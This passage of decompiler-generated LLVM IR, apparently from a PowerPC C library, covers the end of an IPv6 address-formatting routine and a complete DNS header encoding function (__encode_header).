dec_label_pc_10014e60:                            ; preds = %dec_label_pc_10014e40
  br i1 %v3_10014e60, label %dec_label_pc_10014e74, label %dec_label_pc_10014e60.dec_label_pc_10014e68_crit_edge

dec_label_pc_10014e60.dec_label_pc_10014e68_crit_edge: ; preds = %dec_label_pc_10014e60
  %v0_10014e68.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10014e68

dec_label_pc_10014e68:                            ; preds = %dec_label_pc_10014e60.dec_label_pc_10014e68_crit_edge, %dec_label_pc_10014e60.thread
  %v0_10014e68 = phi i32 [ %v0_10014e6876, %dec_label_pc_10014e60.thread ], [ %v0_10014e68.pre, %dec_label_pc_10014e60.dec_label_pc_10014e68_crit_edge ]
  %v0_10014e6062 = phi i32 [ %v0_10014e60.ph, %dec_label_pc_10014e60.thread ], [ %v0_10014e1c39, %dec_label_pc_10014e60.dec_label_pc_10014e68_crit_edge ]
  %v1_10014e68 = icmp slt i32 %v0_10014e68, 1
  %v2_10014e68 = icmp sgt i32 %v0_10014e68, 1
  %v3_10014e68 = icmp eq i32 %v0_10014e68, 1
  store i1 %v1_10014e68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014e68, label %dec_label_pc_10014e74, label %dec_label_pc_10014e70

dec_label_pc_10014e70:                            ; preds = %dec_label_pc_10014e68
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10014e74

dec_label_pc_10014e74:                            ; preds = %dec_label_pc_10014e68, %dec_label_pc_10014e60, %dec_label_pc_10014e70
  %v0_10014e803 = phi i32 [ %v0_10014e6062, %dec_label_pc_10014e68 ], [ -1, %dec_label_pc_10014e60 ], [ -1, %dec_label_pc_10014e70 ]
  %v2_10014e74 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10014e74, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_10014e804 = icmp slt i32 %v0_10014e803, -1
  %v3_10014e806 = icmp eq i32 %v0_10014e803, -1
  store i1 %v1_10014e804, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e806, i1* %cr7_eq.global-to-local, align 1
  %v2_10014ef0 = icmp slt i32 %tmp, 65535
  %v4_10014ef0 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_10014e80

dec_label_pc_10014e80:                            ; preds = %dec_label_pc_10014e74, %dec_label_pc_10014f4c
  %v2_10014ebc = phi i32 [ %v2_10014e74, %dec_label_pc_10014e74 ], [ %v2_10014ea451, %dec_label_pc_10014f4c ]
  %v0_10014e90 = phi i32 [ %v0_10014e803, %dec_label_pc_10014e74 ], [ %v0_10014e80, %dec_label_pc_10014f4c ]
  %v0_10014eb0 = phi i32 [ 0, %dec_label_pc_10014e74 ], [ %v1_10014f4c, %dec_label_pc_10014f4c ]
  %v3_10014e807 = phi i1 [ %v3_10014e806, %dec_label_pc_10014e74 ], [ %v3_10014e80, %dec_label_pc_10014f4c ]
  br i1 %v3_10014e807, label %dec_label_pc_10014eb0, label %dec_label_pc_10014e88

dec_label_pc_10014e88:                            ; preds = %dec_label_pc_10014e80
  %v2_10014e88 = icmp slt i32 %v0_10014eb0, %v0_10014e90
  %v4_10014e88 = icmp eq i32 %v0_10014eb0, %v0_10014e90
  br i1 %v2_10014e88, label %dec_label_pc_10014eb0, label %dec_label_pc_10014e90

dec_label_pc_10014e90:                            ; preds = %dec_label_pc_10014e88
  %v1_10014e90 = load i32, i32* @r30, align 4
  %v2_10014e90 = add i32 %v1_10014e90, %v0_10014e90
  %v2_10014e94 = icmp slt i32 %v0_10014eb0, %v2_10014e90
  %v4_10014e94 = icmp eq i32 %v0_10014eb0, %v2_10014e90
  store i1 %v2_10014e94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014e94, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10014e94, label %dec_label_pc_10014e9c, label %dec_label_pc_10014eb0

dec_label_pc_10014e9c:                            ; preds = %dec_label_pc_10014e90
  br i1 %v4_10014e88, label %dec_label_pc_10014ea0, label %dec_label_pc_10014f4c

dec_label_pc_10014ea0:                            ; preds = %dec_label_pc_10014e9c
  %v3_10014ea4 = inttoptr i32 %v2_10014ebc to i8*
  store i8 58, i8* %v3_10014ea4, align 1
  %v0_10014ea8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014ea8 = add i32 %v0_10014ea8, 1
  store i32 %v1_10014ea8, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f4c

dec_label_pc_10014eb0:                            ; preds = %dec_label_pc_10014e90, %dec_label_pc_10014e88, %dec_label_pc_10014e80
  %v1_10014eb0 = icmp slt i32 %v0_10014eb0, 0
  %v3_10014eb0 = icmp eq i32 %v0_10014eb0, 0
  store i1 %v1_10014eb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014eb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014eb0, label %dec_label_pc_10014ec4.thread, label %dec_label_pc_10014ec4

dec_label_pc_10014ec4.thread:                     ; preds = %dec_label_pc_10014eb0
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014f28

dec_label_pc_10014ec4:                            ; preds = %dec_label_pc_10014eb0
  %v3_10014ebc = inttoptr i32 %v2_10014ebc to i8*
  store i8 58, i8* %v3_10014ebc, align 1
  %v0_10014ec0 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014ec0 = add i32 %v0_10014ec0, 1
  store i32 %v1_10014ec0, i32* %r29.global-to-local, align 4
  %v0_10014ec4.pre = load i32, i32* @r31, align 4
  %v1_10014ec4 = icmp slt i32 %v0_10014ec4.pre, 6
  %v3_10014ec4 = icmp eq i32 %v0_10014ec4.pre, 6
  store i1 %v1_10014ec4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ec4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ec4, label %dec_label_pc_10014ecc, label %dec_label_pc_10014f28

dec_label_pc_10014ecc:                            ; preds = %dec_label_pc_10014ec4
  %v0_10014ecc = load i32, i32* @r28, align 4
  %v1_10014ecc = icmp slt i32 %v0_10014ecc, 0
  %v3_10014ecc = icmp eq i32 %v0_10014ecc, 0
  store i1 %v1_10014ecc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ecc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ecc, label %dec_label_pc_10014ed4, label %dec_label_pc_10014f28

dec_label_pc_10014ed4:                            ; preds = %dec_label_pc_10014ecc
  %v0_10014ed4 = load i32, i32* @r30, align 4
  %v1_10014ed4 = icmp slt i32 %v0_10014ed4, 6
  %v3_10014ed4 = icmp eq i32 %v0_10014ed4, 6
  store i1 %v1_10014ed4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014ed4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014ed4, label %dec_label_pc_10014ef8, label %dec_label_pc_10014edc

dec_label_pc_10014edc:                            ; preds = %dec_label_pc_10014ed4
  %v1_10014edc = icmp slt i32 %v0_10014ed4, 5
  %v3_10014edc = icmp eq i32 %v0_10014ed4, 5
  store i1 %v1_10014edc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014edc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014edc, label %dec_label_pc_10014ee4, label %dec_label_pc_10014f28

dec_label_pc_10014ee4:                            ; preds = %dec_label_pc_10014edc
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_10014ef0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014ef0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014ef0, label %dec_label_pc_10014ef8, label %dec_label_pc_10014f28

dec_label_pc_10014ef8:                            ; preds = %dec_label_pc_10014ee4, %dec_label_pc_10014ed4
  %v1_10014ef8 = load i32, i32* @r1, align 4
  %v2_10014ef8 = sub i32 %v1_10014ef8, %v1_10014ec0
  %v0_10014efc = load i32, i32* @r27, align 4
  %v1_10014efc = add i32 %v0_10014efc, 12
  %v1_10014f00 = add i32 %v2_10014ef8, 86
  store i32 ptrtoint ([3 x i8]* @global_var_10014f0c.726 to i32), i32* @lr, align 4
  %v3_10014f08 = call i32 @inet_ntop4(i32 %v1_10014efc, i32 %v1_10014ec0, i32 %v1_10014f00)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10014f10 = icmp slt i32 %v3_10014f08, 0
  %v3_10014f10 = icmp eq i32 %v3_10014f08, 0
  store i1 %v1_10014f10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014f10, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014f10, label %dec_label_pc_10014fc8, label %dec_label_pc_10014f18

dec_label_pc_10014f18:                            ; preds = %dec_label_pc_10014ef8
  %v0_10014f18 = load i32, i32* @r29, align 4
  store i32 %v0_10014f18, i32* @r3, align 4
  %v0_10014f1c = call i32 @__GI_strlen()
  %v0_10014f20 = load i32, i32* @r29, align 4
  %v2_10014f20 = add i32 %v0_10014f20, %v0_10014f1c
  store i32 %v2_10014f20, i32* %r29.global-to-local, align 4
  %v0_10014f60.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10014f60

dec_label_pc_10014f28:                            ; preds = %dec_label_pc_10014ec4.thread, %dec_label_pc_10014ee4, %dec_label_pc_10014edc, %dec_label_pc_10014ecc, %dec_label_pc_10014ec4
  %v0_10014f2867 = phi i32 [ 0, %dec_label_pc_10014ec4.thread ], [ 6, %dec_label_pc_10014ee4 ], [ 6, %dec_label_pc_10014edc ], [ 6, %dec_label_pc_10014ecc ], [ %v0_10014ec4.pre, %dec_label_pc_10014ec4 ]
  %v0_10014f0466 = phi i32 [ %v2_10014ebc, %dec_label_pc_10014ec4.thread ], [ %v1_10014ec0, %dec_label_pc_10014ee4 ], [ %v1_10014ec0, %dec_label_pc_10014edc ], [ %v1_10014ec0, %dec_label_pc_10014ecc ], [ %v1_10014ec0, %dec_label_pc_10014ec4 ]
  %v1_10014f28 = mul i32 %v0_10014f2867, 4
  store i32 %v2_10014d80, i32* %r9.global-to-local, align 4
  %v2_10014f30 = add i32 %v1_10014f28, %v2_10014d80
  %v3_10014f30 = inttoptr i32 %v2_10014f30 to i32*
  %v4_10014f30 = load i32, i32* %v3_10014f30, align 4
  store i32 %v0_10014f0466, i32* @r3, align 4
  store i32 268521288, i32* @lr, align 4
  %v5_10014f44 = call i32 @sprintf(i32 %v0_10014f0466, i32 ptrtoint ([3 x i8]* @global_var_1001a674.727 to i32), i32 %v4_10014f30, i32 %v2_10014d80)
  %v0_10014f48 = load i32, i32* @r29, align 4
  %v2_10014f48 = add i32 %v0_10014f48, %v5_10014f44
  store i32 %v2_10014f48, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f4c

dec_label_pc_10014f4c:                            ; preds = %dec_label_pc_10014e9c, %dec_label_pc_10014ea0, %dec_label_pc_10014f28
  %v2_10014ea451 = phi i32 [ %v2_10014ebc, %dec_label_pc_10014e9c ], [ %v1_10014ea8, %dec_label_pc_10014ea0 ], [ %v2_10014f48, %dec_label_pc_10014f28 ]
  %v0_10014f4c = load i32, i32* @r31, align 4
  %v1_10014f4c = add i32 %v0_10014f4c, 1
  store i32 %v1_10014f4c, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_10014f4c, 8
  %v0_10014e80 = load i32, i32* @r28, align 4
  %v1_10014e80 = icmp slt i32 %v0_10014e80, -1
  %v3_10014e80 = icmp eq i32 %v0_10014e80, -1
  store i1 %v1_10014e80, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e80, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_10014e80, label %dec_label_pc_10014f58

dec_label_pc_10014f58:                            ; preds = %dec_label_pc_10014f4c
  br i1 %v3_10014e80, label %dec_label_pc_10014f78, label %dec_label_pc_10014f60

dec_label_pc_10014f60:                            ; preds = %dec_label_pc_10014f58, %dec_label_pc_10014f18
  %v2_10014f70 = phi i32 [ %v2_10014ea451, %dec_label_pc_10014f58 ], [ %v2_10014f20, %dec_label_pc_10014f18 ]
  %v0_10014f60 = phi i32 [ %v0_10014e80, %dec_label_pc_10014f58 ], [ %v0_10014f60.pre, %dec_label_pc_10014f18 ]
  %v1_10014f60 = load i32, i32* @r30, align 4
  %v2_10014f60 = add i32 %v1_10014f60, %v0_10014f60
  %v1_10014f64 = icmp slt i32 %v2_10014f60, 8
  %v3_10014f64 = icmp eq i32 %v2_10014f60, 8
  store i1 %v1_10014f64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014f64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014f64, label %dec_label_pc_10014f6c, label %dec_label_pc_10014f78

dec_label_pc_10014f6c:                            ; preds = %dec_label_pc_10014f60
  %v3_10014f70 = inttoptr i32 %v2_10014f70 to i8*
  store i8 58, i8* %v3_10014f70, align 1
  %v0_10014f74 = load i32, i32* %r29.global-to-local, align 4
  %v1_10014f74 = add i32 %v0_10014f74, 1
  store i32 %v1_10014f74, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014f78

dec_label_pc_10014f78:                            ; preds = %dec_label_pc_10014f60, %dec_label_pc_10014f58, %dec_label_pc_10014f6c
  %v2_10014f8c = phi i32 [ %v2_10014f70, %dec_label_pc_10014f60 ], [ %v2_10014ea451, %dec_label_pc_10014f58 ], [ %v1_10014f74, %dec_label_pc_10014f6c ]
  %v1_10014f78 = sub i32 1, %v2_10014e74
  %v2_10014f80 = add i32 %v1_10014f78, %v2_10014f8c
  %v1_10014f84 = load i32, i32* @r26, align 4
  %v2_10014f84 = icmp ult i32 %v2_10014f80, %v1_10014f84
  %v4_10014f84 = icmp eq i32 %v2_10014f80, %v1_10014f84
  store i1 %v2_10014f84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014f84, i1* %cr7_eq.global-to-local, align 1
  %v3_10014f8c = inttoptr i32 %v2_10014f8c to i8*
  store i8 0, i8* %v3_10014f8c, align 1
  %v0_10014f90 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10014f90 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10014f90 = or i1 %v0_10014f90, %v1_10014f90
  br i1 %v2_10014f90, label %dec_label_pc_10014fa8, label %dec_label_pc_10014f94

dec_label_pc_10014f94:                            ; preds = %dec_label_pc_10014f78
  %v0_10014f94 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014fa0 = inttoptr i32 %v0_10014f94 to i32*
  store i32 28, i32* %v2_10014fa0, align 4
  %v0_10014fcc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fc8

dec_label_pc_10014fa8:                            ; preds = %dec_label_pc_10014f78
  %v0_10014fa8 = load i32, i32* @r25, align 4
  %v2_10014fac = bitcast i32* %stack_var_-88 to i8*
  %v3_10014fac = call i32 @strcpy(i32 %v0_10014fa8, i8* %v2_10014fac)
  br label %dec_label_pc_10014fb0

dec_label_pc_10014fb0:                            ; preds = %dec_label_pc_10014d6c, %dec_label_pc_10014fa8
  %storemerge1 = phi i32 [ %v3_10014d78, %dec_label_pc_10014d6c ], [ %v3_10014fac, %dec_label_pc_10014fa8 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fc8

dec_label_pc_10014fb8:                            ; preds = %dec_label_pc_10014d60
  %v0_10014fb8 = call i32 @__errno_location()
  %v2_10014fc0 = inttoptr i32 %v0_10014fb8 to i32*
  store i32 97, i32* %v2_10014fc0, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014fc8

dec_label_pc_10014fc8:                            ; preds = %dec_label_pc_10014ef8, %dec_label_pc_10014fb0, %dec_label_pc_10014f94, %dec_label_pc_10014fb8
  %v0_10014fcc = phi i32 [ 0, %dec_label_pc_10014ef8 ], [ %storemerge1, %dec_label_pc_10014fb0 ], [ %v0_10014fcc.pre, %dec_label_pc_10014f94 ], [ 0, %dec_label_pc_10014fb8 ]
  ret i32 %v0_10014fcc

; uselistorder directives
  uselistorder i32 %v2_10014f8c, { 1, 0 }
  uselistorder i32 %v2_10014f60, { 1, 0 }
  uselistorder i1 %v3_10014e80, { 0, 2, 1 }
  uselistorder i32 %v0_10014e80, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10014f4c, { 2, 1, 0 }
  uselistorder i32 %v0_10014f0466, { 1, 0 }
  uselistorder i32 %v3_10014f08, { 1, 0 }
  uselistorder i32 %v0_10014ed4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014ec4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_10014ec0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_10014e90, { 1, 0 }
  uselistorder i32 %v0_10014eb0, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_10014e90, { 0, 2, 1 }
  uselistorder i32 %v2_10014ebc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10014e803, { 0, 2, 1 }
  uselistorder i32 %v0_10014e68, { 2, 1, 0 }
  uselistorder i32 %v0_10014e58.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_10014e60, { 1, 0, 2 }
  uselistorder i32 %v1_10014e3c, { 2, 1, 0 }
  uselistorder i32 %v1_10014e38, { 1, 0 }
  uselistorder i32 %v0_10014e1c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_10014e2c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_10014df0, { 1, 0 }
  uselistorder i32 %v0_10014e38, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_10014df0, { 1, 0 }
  uselistorder i32 %v0_10014e1c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10014e2c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_10014dcc, { 1, 0 }
  uselistorder i32 %v2_10014dc4, { 1, 0 }
  uselistorder i32 %v0_10014dbc, { 1, 0, 2 }
  uselistorder i32 %v1_10014da4, { 1, 0 }
  uselistorder i32 %v2_10014d80, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 16, 9, 10, 17, 12, 18, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 16, 9, 10, 17, 12, 18, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 9, 6, 0, 7, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 10, 0, 11, 15, 16, 12, 13, 14, 5, 6, 7, 8, 9, 17 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 29, 28, 13, 2, 12, 11, 10, 0, 5, 1, 9, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 8, 7, 6, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10014fc8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10014fb0, { 1, 0 }
  uselistorder label %dec_label_pc_10014f78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014f28, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10014e80, { 1, 0 }
  uselistorder label %dec_label_pc_10014e74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014e58, { 1, 0 }
  uselistorder label %dec_label_pc_10014e38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014e34, { 1, 0 }
  uselistorder label %dec_label_pc_10014dec, { 1, 0 }
  uselistorder label %dec_label_pc_10014da4, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_100150c4, label %dec_label_pc_10014fec

dec_label_pc_10014fec:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10014fec = add i32 %tmp, 2
  %v2_10014fec = inttoptr i32 %v1_10014fec to i8*
  %v3_10014fec = load i8, i8* %v2_10014fec, align 1
  %v4_10014fec = zext i8 %v3_10014fec to i32
  store i32 %v4_10014fec, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10014fec, i8* %tmp3, align 1
  %v2_10014ff8 = load i32, i32* %arg1, align 4
  store i32 %v2_10014ff8, i32* %r0.global-to-local, align 4
  %v1_10014ffc = trunc i32 %v2_10014ff8 to i8
  %v4_10014ffc = add i32 %arg2, 1
  %v5_10014ffc = inttoptr i32 %v4_10014ffc to i8*
  store i8 %v1_10014ffc, i8* %v5_10014ffc, align 1
  %v1_10015000 = add i32 %tmp, 12
  %v2_10015000 = inttoptr i32 %v1_10015000 to i32*
  %v3_10015000 = load i32, i32* %v2_10015000, align 4
  store i32 %v3_10015000, i32* %r0.global-to-local, align 4
  %v1_10015004 = add i32 %tmp, 16
  %v2_10015004 = inttoptr i32 %v1_10015004 to i32*
  %v3_10015004 = load i32, i32* %v2_10015004, align 4
  store i32 %v3_10015004, i32* %r11.global-to-local, align 4
  %v1_10015008 = add i32 %tmp, 4
  %v2_10015008 = inttoptr i32 %v1_10015008 to i32*
  %v3_10015008 = load i32, i32* %v2_10015008, align 4
  %v2_1001500c = icmp ne i32 %v3_10015000, 0
  %v5_10015010 = zext i1 %v2_1001500c to i32
  store i32 %v5_10015010, i32* %r10.global-to-local, align 4
  %v1_10015014 = add i32 %tmp, 8
  %v2_10015014 = inttoptr i32 %v1_10015014 to i32*
  %v3_10015014 = load i32, i32* %v2_10015014, align 4
  %v2_10015018 = icmp ne i32 %v3_10015004, 0
  %v5_1001501c = zext i1 %v2_10015018 to i32
  %v1_10015020 = add i32 %tmp, 20
  %v2_10015020 = inttoptr i32 %v1_10015020 to i32*
  %v3_10015020 = load i32, i32* %v2_10015020, align 4
  store i32 %v3_10015020, i32* %r0.global-to-local, align 4
  %not.v2_10015024 = icmp eq i32 %v3_10015008, 0
  %v6_10015028 = sext i1 %not.v2_10015024 to i32
  store i32 %v5_1001501c, i32* %r11.global-to-local, align 4
  %v1_10015030 = call i32 @__asm_rlwinm(i32 %v6_10015028, i32 0, i32 24, i32 24)
  %v0_10015034 = load i32, i32* %r10.global-to-local, align 4
  %v1_10015034 = mul i32 %v0_10015034, 4
  store i32 %v1_10015034, i32* %r10.global-to-local, align 4
  %v1_10015038 = call i32 @__asm_rlwinm(i32 %v3_10015014, i32 3, i32 25, i32 28)
  %v0_1001503c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001503c = icmp ne i32 %v0_1001503c, 0
  %v5_10015040 = zext i1 %v2_1001503c to i32
  %v2_10015044 = or i32 %v1_10015034, %v1_10015038
  store i32 %v2_10015044, i32* %r10.global-to-local, align 4
  %v1_10015048 = add i32 %v1_10015030, 128
  %v0_1001504c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001504c = mul i32 %v0_1001504c, 2
  store i32 %v1_1001504c, i32* %r11.global-to-local, align 4
  %v2_10015050 = or i32 %v2_10015044, %v5_10015040
  store i32 %v2_10015050, i32* %r0.global-to-local, align 4
  %v2_10015054 = or i32 %v2_10015050, %v1_10015048
  %v2_10015058 = or i32 %v2_10015054, %v1_1001504c
  %v1_1001505c = trunc i32 %v2_10015058 to i8
  %v4_1001505c = add i32 %arg2, 2
  %v5_1001505c = inttoptr i32 %v4_1001505c to i8*
  store i8 %v1_1001505c, i8* %v5_1001505c, align 1
  %v1_10015060 = add i32 %tmp, 24
  %v2_10015060 = inttoptr i32 %v1_10015060 to i32*
  %v3_10015060 = load i32, i32* %v2_10015060, align 4
  %v1_10015064 = add i32 %tmp, 28
  %v2_10015064 = inttoptr i32 %v1_10015064 to i32*
  %v3_10015064 = load i32, i32* %v2_10015064, align 4
  store i32 %v3_10015064, i32* %r0.global-to-local, align 4
  %not.v2_10015068 = icmp eq i32 %v3_10015060, 0
  %v6_1001506c = sext i1 %not.v2_10015068 to i32
  %v1_10015070 = call i32 @__asm_rlwinm(i32 %v6_1001506c, i32 0, i32 24, i32 24)
  %v1_10015074 = urem i32 %v3_10015064, 16
  store i32 %v1_10015074, i32* %r0.global-to-local, align 4
  %v1_10015078 = add i32 %v1_10015070, 128
  %v2_1001507c = or i32 %v1_10015074, %v1_10015078
  %v1_10015080 = trunc i32 %v2_1001507c to i8
  %v4_10015080 = add i32 %arg2, 3
  %v5_10015080 = inttoptr i32 %v4_10015080 to i8*
  store i8 %v1_10015080, i8* %v5_10015080, align 1
  %v1_10015084 = add i32 %tmp, 34
  %v2_10015084 = inttoptr i32 %v1_10015084 to i8*
  %v3_10015084 = load i8, i8* %v2_10015084, align 1
  %v4_10015084 = zext i8 %v3_10015084 to i32
  store i32 %v4_10015084, i32* %r0.global-to-local, align 4
  %v4_10015088 = add i32 %arg2, 4
  %v5_10015088 = inttoptr i32 %v4_10015088 to i8*
  store i8 %v3_10015084, i8* %v5_10015088, align 1
  %v1_1001508c = add i32 %tmp, 32
  %v2_1001508c = inttoptr i32 %v1_1001508c to i32*
  %v3_1001508c = load i32, i32* %v2_1001508c, align 4
  store i32 %v3_1001508c, i32* %r0.global-to-local, align 4
  %v1_10015090 = trunc i32 %v3_1001508c to i8
  %v4_10015090 = add i32 %arg2, 5
  %v5_10015090 = inttoptr i32 %v4_10015090 to i8*
  store i8 %v1_10015090, i8* %v5_10015090, align 1
  %v1_10015094 = add i32 %tmp, 38
  %v2_10015094 = inttoptr i32 %v1_10015094 to i8*
  %v3_10015094 = load i8, i8* %v2_10015094, align 1
  %v4_10015094 = zext i8 %v3_10015094 to i32
  store i32 %v4_10015094, i32* %r0.global-to-local, align 4
  %v4_10015098 = add i32 %arg2, 6
  %v5_10015098 = inttoptr i32 %v4_10015098 to i8*
  store i8 %v3_10015094, i8* %v5_10015098, align 1
  %v1_1001509c = add i32 %tmp, 36
  %v2_1001509c = inttoptr i32 %v1_1001509c to i32*
  %v3_1001509c = load i32, i32* %v2_1001509c, align 4
  store i32 %v3_1001509c, i32* %r0.global-to-local, align 4
  %v1_100150a0 = trunc i32 %v3_1001509c to i8
  %v4_100150a0 = add i32 %arg2, 7
  %v5_100150a0 = inttoptr i32 %v4_100150a0 to i8*
  store i8 %v1_100150a0, i8* %v5_100150a0, align 1
  %v1_100150a4 = add i32 %tmp, 42
  %v2_100150a4 = inttoptr i32 %v1_100150a4 to i8*
  %v3_100150a4 = load i8, i8* %v2_100150a4, align 1
  %v4_100150a4 = zext i8 %v3_100150a4 to i32
  store i32 %v4_100150a4, i32* %r0.global-to-local, align 4
  %v4_100150a8 = add i32 %arg2, 8
  %v5_100150a8 = inttoptr i32 %v4_100150a8 to i8*
  store i8 %v3_100150a4, i8* %v5_100150a8, align 1
  %v1_100150ac = add i32 %tmp, 40
  %v2_100150ac = inttoptr i32 %v1_100150ac to i32*
  %v3_100150ac = load i32, i32* %v2_100150ac, align 4
  store i32 %v3_100150ac, i32* %r0.global-to-local, align 4
  %v1_100150b0 = trunc i32 %v3_100150ac to i8
  %v4_100150b0 = add i32 %arg2, 9
  %v5_100150b0 = inttoptr i32 %v4_100150b0 to i8*
  store i8 %v1_100150b0, i8* %v5_100150b0, align 1
  %v1_100150b4 = add i32 %tmp, 46
  %v2_100150b4 = inttoptr i32 %v1_100150b4 to i8*
  %v3_100150b4 = load i8, i8* %v2_100150b4, align 1
  %v4_100150b4 = zext i8 %v3_100150b4 to i32
  store i32 %v4_100150b4, i32* %r0.global-to-local, align 4
  %v4_100150b8 = add i32 %arg2, 10
  %v5_100150b8 = inttoptr i32 %v4_100150b8 to i8*
  store i8 %v3_100150b4, i8* %v5_100150b8, align 1
  %v1_100150bc = add i32 %tmp, 44
  %v2_100150bc = inttoptr i32 %v1_100150bc to i32*
  %v3_100150bc = load i32, i32* %v2_100150bc, align 4
  store i32 %v3_100150bc, i32* %r0.global-to-local, align 4
  %v1_100150c0 = trunc i32 %v3_100150bc to i8
  %v4_100150c0 = add i32 %arg2, 11
  %v5_100150c0 = inttoptr i32 %v4_100150c0 to i8*
  store i8 %v1_100150c0, i8* %v5_100150c0, align 1
  %v0_100150c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100150c4

dec_label_pc_100150c4:                            ; preds = %entry, %dec_label_pc_10014fec
  %v0_100150c4 = phi i32 [ -1, %entry ], [ %v0_100150c4.pre, %dec_label_pc_10014fec ]
  ret i32 %v0_100150c4

; uselistorder directives
  uselistorder i32 %v1_10015074, { 1, 0 }
  uselistorder i32 %v1_1001504c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
